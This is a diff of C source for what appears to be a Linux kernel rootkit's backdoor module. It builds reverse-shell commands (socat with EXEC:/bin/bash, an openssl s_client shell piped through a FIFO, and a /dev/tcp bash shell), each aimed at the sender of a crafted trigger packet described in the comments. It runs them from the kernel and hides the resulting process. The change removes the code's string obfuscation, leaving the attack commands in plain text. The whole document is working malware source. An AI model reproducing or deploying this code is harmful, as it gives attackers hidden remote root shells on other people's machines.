@@ -184,23 +184,17 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                 {
                     /**
                      * same as RR_SOCAT but on dst port RR_SOCAT_TTY
-                     * XXX: remove this lame obfuscation
                      */
                     //"%s OPENSSL:%s:%s,verify=0 EXEC:\"tail -F -n +1 /var/.<random>\""
-                    char *a = kv_whatever_copystr(_OBF_OPENSSL, sizeof(_OBF_OPENSSL));
-                    char *b = kv_whatever_copystr(_OBF_VERIFY_0, sizeof(_OBF_VERIFY_0));
-                    char *c = kv_whatever_copystr(_OBF_EXEC, sizeof(_OBF_EXEC));
-                    char *d = kv_whatever_copystr(_OBF_TAIL, sizeof(_OBF_TAIL));
-                    char *e = sys_ttyfile();
-                    if (a && b && c && d && e) {
+                    char *tty = sys_ttyfile();
+                    if (tty) {
                         int len;
                         char ip[INET_ADDRSTRLEN+1] = {0};
                         snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
-                        len = snprintf(NULL, 0, "%s %s:%s:%u,%s %s:\"%s %s\"", exe, a, ip, src_port, b, c, d, e);
+                        len = snprintf(NULL, 0, "%s OPENSSL:%s:%u,verify=0 EXEC:\"tail -F -n +1 %s\"", exe, ip, src_port, tty);
                         if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
-                            snprintf(bd, len, "%s %s:%s:%u,%s %s:\"%s %s\"", exe, a, ip, src_port, b, c, d, e);
+                            snprintf(bd, len, "%s OPENSSL:%s:%u,verify=0 EXEC:\"tail -F -n +1 %s\"", exe, ip, src_port, tty);
                     }
-                    kv_mem_free(&a,&b,&c,&d);
                 }
                 break;
             case RR_SOCAT:
@@ -211,20 +205,12 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                      * socat -d -d OPENSSL-LISTEN:<#PORT>,cert=server.pem,verify=0,fork STDOUT
                      * trigger: nping <IP> --tcp -p RR_SOCAT --flags fin,urg,ack --source-port <#PORT> -c 1
                      */
-                    //"%s OPENSSL:%s:%s,verify=0 EXEC:/bin/bash"
-                    char *a = kv_whatever_copystr(_OBF_OPENSSL, sizeof(_OBF_OPENSSL));
-                    char *b = kv_whatever_copystr(_OBF_VERIFY_0, sizeof(_OBF_VERIFY_0));
-                    char *c = kv_whatever_copystr(_OBF_EXEC, sizeof(_OBF_EXEC));
-                    char *d = kv_whatever_copystr(_OBF__BIN_BASH, sizeof(_OBF__BIN_BASH));
-                    if (a && b && c && d) {
-                        int len;
-                        char ip[INET_ADDRSTRLEN+1] = {0};
-                        snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
-                        len = snprintf(NULL, 0, "%s %s:%s:%u,%s %s:%s", exe, a, ip, src_port, b, c, d);
-                        if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
-                            snprintf(bd, len, "%s %s:%s:%u,%s %s:%s", exe, a, ip, src_port, b, c, d);
-                    }
-                    kv_mem_free(&a,&b,&c,&d);
+                    int len;
+                    char ip[INET_ADDRSTRLEN+1] = {0};
+                    snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
+                    len = snprintf(NULL, 0, "%s OPENSSL:%s:%u,verify=0 EXEC:/bin/bash", exe, ip, src_port);
+                    if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
+                        snprintf(bd, len, "%s OPENSSL:%s:%u,verify=0 EXEC:/bin/bash", exe, ip, src_port);
                 }
                 break;
             case RR_OPENSSL:
@@ -234,26 +220,19 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                      * openssl s_server -key key.pem -cert cert.pem -accept <#PORT>
                      * trigger: nping <IP> --tcp -p RR_OPENSSL --flags fin,urg,ack --source-port <#PORT> -c 1
                      */
-                    //"/usr/bin/mkfifo /tmp/.stfu; /bin/sh -i < /tmp/.stfu 2>&1 |"
-                    //  "%s s_client -quiet -connect %s:%s > /tmp/.stfu";
-                    char *a = kv_whatever_copystr(_OBF_USR_BIN_MKFIFO, sizeof(_OBF_USR_BIN_MKFIFO));
-                    char *b = kv_whatever_copystr(_OBF_TMP, sizeof(_OBF_TMP));
-                    char *c = kv_whatever_copystr(_OBF__STFU, sizeof(_OBF__STFU));
-                    char *d = kv_whatever_copystr(_OBF_BIN_SH, sizeof(_OBF_BIN_SH));
-                    char *e = kv_whatever_copystr(_OBF_STD_TWO, sizeof(_OBF_STD_TWO));
-                    char *f = kv_whatever_copystr(_OBF_SCLIENT__QUIET__CONNECT, sizeof(_OBF_SCLIENT__QUIET__CONNECT));
-
-                    if (a && b && c && d && e && f) {
+                    char *ssl = sys_sslfile();
+                    if (ssl) {
                         int len;
                         char ip[INET_ADDRSTRLEN+1] = {0};
+
                         snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
-                        len = snprintf(NULL, 0, "%s %s/%s; %s -i < %s/%s %s | %s %s %s:%u > %s/%s",
-                                a, b, c, d, b, c, e, exe, f, ip, src_port, b, c);
+                        snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
+                        len = snprintf(NULL, 0, "/usr/bin/mkfifo %s; /bin/sh -i < %s 2>&1 | %s s_client -quiet -connect %s:%u > %s",
+                                ssl, ssl, exe, ip, src_port, ssl);
                         if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
-                            snprintf(bd, len, "%s %s/%s; %s -i < %s/%s %s | %s %s %s:%u > %s/%s",
-                                    a, b, c, d, b, c, e, exe, f, ip, src_port, b, c);
+                            snprintf(bd, len, "/usr/bin/mkfifo %s; /bin/sh -i < %s 2>&1 | %s s_client -quiet -connect %s:%u > %s",
+                                    ssl, ssl, exe, ip, src_port, ssl);
                     }
-                    kv_mem_free(&a,&b,&c,&d,&e,&f);
                 }
                 break;
             case RR_NC:
@@ -263,19 +242,12 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                      * trigger: nping <IP> --tcp -p RR_NC --flags fin,urg,ack --source-port <#PORT> -c 1
                      */
                     //"/bin/sh -i >& /dev/tcp/%s/%s 0>&1";
-                    char *a = kv_whatever_copystr(_OBF_BIN_SH, sizeof(_OBF_BIN_SH));
-                    char *b = kv_whatever_copystr(_OBF__INTERACTIVE, sizeof(_OBF__INTERACTIVE));
-                    char *c = kv_whatever_copystr(_OBF_DEV_TCP, sizeof(_OBF_DEV_TCP));
-                    char *d = kv_whatever_copystr(_OBF_STD_ZERO, sizeof(_OBF_STD_ZERO));
-                    if (a && b && c && d) {
-                        int len;
-                        char ip[INET_ADDRSTRLEN+1] = {0};
-                        snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
-                        len = snprintf(NULL, 0, "%s %s %s/%s/%u %s", a, b, c, ip, src_port, d);
-                        if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
-                            snprintf(bd, len, "%s %s %s/%s/%u %s", a, b, c, ip, src_port, d);
-                    }
-                    kv_mem_free(&a,&b,&c,&d);
+                    int len;
+                    char ip[INET_ADDRSTRLEN+1] = {0};
+                    snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
+                    len = snprintf(NULL, 0, "/bin/sh -i >& /dev/tcp/%s/%u 0>&1", ip, src_port);
+                    if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
+                        snprintf(bd, len, "/bin/sh -i >& /dev/tcp/%s/%u 0>&1", ip, src_port);
                 }
                 break;
             default:
@@ -289,12 +261,8 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
  * or reverse shell
  */
 static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
-    char *p0 = kv_whatever_copystr(_OBF__BIN_BASH, sizeof(_OBF__BIN_BASH));
-    char *p1 = kv_whatever_copystr(_OBF__C, sizeof(_OBF__C));
-    char *p2 = kv_whatever_copystr(_OBF_HOME, sizeof(_OBF_HOME));
-    char *p3 = kv_whatever_copystr(_OBF_TERM_LINUX, sizeof(_OBF_TERM_LINUX));
-    char *argv[] = {p0, p1, NULL, NULL};
-    char *envp[] = {p2, p3, NULL};
+    char *argv[] = {"/bin/bash", "-c", NULL, NULL};
+    char *envp[] = {"HOME=/", "TERM=linux", NULL};
     int ret = -1;
     pid_t shellpid = 0;
     struct subprocess_info *info;
@@ -303,16 +271,9 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
             RR_SOCAT : select);
     char *rev;
 
-    if (!p0 || !p1 || !p2 || !p3) {
-        prerr("Memory error\n");
-        kv_mem_free(&p0,&p1,&p2,&p3);
-        return ret;
-    }
-
     if (select != RR_NC && !binpath) {
         /** do nothing */
         prwarn("Could not find executable associated with port %d\n", select);
-        kv_mem_free(&p0,&p1,&p2,&p3);
         return ret;
     }
 
@@ -320,10 +281,8 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
     if (!rev) {
         /** do nothing */
         prwarn("Invalid port selection: %d\n", select);
-        kv_mem_free(&p0,&p1,&p2,&p3);
         return ret;
     }
-
 
     argv[2] = rev;
 
@@ -342,20 +301,7 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
         kv_hide_task_by_pid(shellpid, saddr, WHATEVER);
     }
 
-    if (select == RR_OPENSSL) {
-        // /tmp/.stfu
-        char *a = kv_whatever_copystr(_OBF_TMP, sizeof(_OBF_TMP));
-        char *b = kv_whatever_copystr(_OBF__STFU, sizeof(_OBF__STFU));
-        int len = snprintf(NULL, 0, "%s/%s", a, b);
-        if (len) {
-            char f[len+1];
-            snprintf(f, len+1, "%s/%s", a, b);
-            ret = fs_file_rm(f);
-        }
-        kv_mem_free(&a,&b);
-    }
-
-    kv_mem_free(&p0,&p1,&p2,&p3,&rev);
+    kv_mem_free(&rev);
 
     return ret;
 }
